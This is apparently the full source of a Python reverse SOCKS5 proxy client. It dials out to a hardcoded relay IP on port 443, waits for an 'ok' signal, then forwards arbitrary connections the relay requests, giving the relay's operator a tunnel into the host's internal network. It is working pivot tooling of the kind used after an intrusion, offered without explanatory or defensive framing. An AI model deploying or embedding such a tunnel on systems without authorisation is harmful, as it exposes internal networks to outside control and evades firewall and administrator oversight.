#!/usr/bin/env python3
#coding:utf-8

import socket
import struct
import sys
import threading
import select

BUF_SIZE = 4096
FLAG = 0
CMD = b"ok"  # Changed to bytes for Python 3

class Socks5proxy(object):
    def exchange_data(self, sock, remote):
        try:
            inputs = [sock, remote]
            while True:
                r, w, e = select.select(inputs, [], [])
                if sock in r:
                    data = sock.recv(BUF_SIZE)
                    if not data or remote.send(data) <= 0:
                        sock.close()
                        remote.close()
                        break
                if remote in r:
                    data = remote.recv(BUF_SIZE)
                    if not data or sock.send(data) <= 0:
                        sock.close()
                        remote.close()
                        break
        except Exception as e:  # Python 3 syntax
            try:
                sock.send(b"socket error")
            except:
                pass
            try:
                remote.shutdown(socket.SHUT_RDWR)
                remote.close()
            except:
                pass
            try:
                sock.shutdown(socket.SHUT_RDWR)
                sock.close()
            except:
                pass
        except KeyboardInterrupt:
            try:
                remote.shutdown(socket.SHUT_RDWR)
                remote.close()
            except:
                pass
            try:
                sock.shutdown(socket.SHUT_RDWR)
                sock.close()
            except:
                pass
            sys.exit(1)

    def remote(self, ipaddr, port, mode, c):
        global FLAG
        try:
            r = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            r.connect((ipaddr, port))
            if mode == 1:
                reply = b"\x05\x00\x00\x01"
                FLAG = 1
            else:
                reply = b"\x05\x07\x00\x01"
                FLAG = 0
            local = r.getsockname()
            reply += socket.inet_aton(local[0]) + struct.pack(">H", local[1])
        except Exception as e:  # Python 3 syntax
            reply = b"\x05\x05\x00\x01\x00\x00\x00\x00\x00\x00"
            FLAG = 0
        c.send(reply)
        return r

    def reverse_socks5_main(self, daddr, dport):
        global BUF_SIZE
        global FLAG
        global CMD
        try:
            s1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s1.connect((daddr, dport))
            print(f"[*] Connected to relay server: {daddr}:{dport}")  # Python 3 print
            while True:
                flag = s1.recv(BUF_SIZE)
                if flag == CMD:
                    threading.Thread(target=self.reverse_socks5_hand, args=(daddr, dport)).start()
        except Exception as e:  # Python 3 syntax
            print(f"[-] Connection error: {e}")  # Python 3 print
            try:
                s1.shutdown(socket.SHUT_RDWR)
                s1.close()
            except:
                pass
            sys.exit(1)
        except KeyboardInterrupt:
            print("[-] Interrupted by user")  # Python 3 print
            try:
                s1.shutdown(socket.SHUT_RDWR)
                s1.close()
            except:
                pass
            sys.exit(1)

    def reverse_socks5_hand(self, daddr, dport):
        try:
            s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s2.connect((daddr, dport))
            s2.recv(BUF_SIZE)
            s2.send(b"\x05\x00")
            data = s2.recv(BUF_SIZE)
            if data:
                mode = data[1]  # Python 3: no need for ord() with bytes
                addrtype = data[3]
                if addrtype == 1:  # IPv4
                    addr = socket.inet_ntoa(data[4:8])
                    port = struct.unpack('!H', data[8:10])[0]
                elif addrtype == 3:  # Domain name
                    length = data[4]  # Python 3: no need for struct.unpack
                    addr = data[5:5 + length].decode('utf-8')
                    port = struct.unpack('!H', data[5 + length:5 + length + 2])[0]
                r = self.remote(addr, port, mode, s2)
                self.exchange_data(s2, r)
            else:
                try:
                    s2.shutdown(socket.SHUT_RDWR)
                    s2.close()
                except:
                    pass
        except Exception as e:  # Python 3 syntax
            print(f"[-] Handler error: {e}")  # Python 3 print
            try:
                s2.shutdown(socket.SHUT_RDWR)
                s2.close()
            except:
                pass
        except KeyboardInterrupt:
            try:
                s2.shutdown(socket.SHUT_RDWR)
                s2.close()
            except:
                pass
            sys.exit(1)

if __name__ == "__main__":
    resocks5 = Socks5proxy()
    server = "172.172.131.251"  # Change this to your relay server IP
    port = 443  # Port to match your server setup
    print(f"[*] Starting reverse SOCKS5 client...")
    print(f"[*] Connecting to relay server: {server}:{port}")
    resocks5.reverse_socks5_main(server, port) 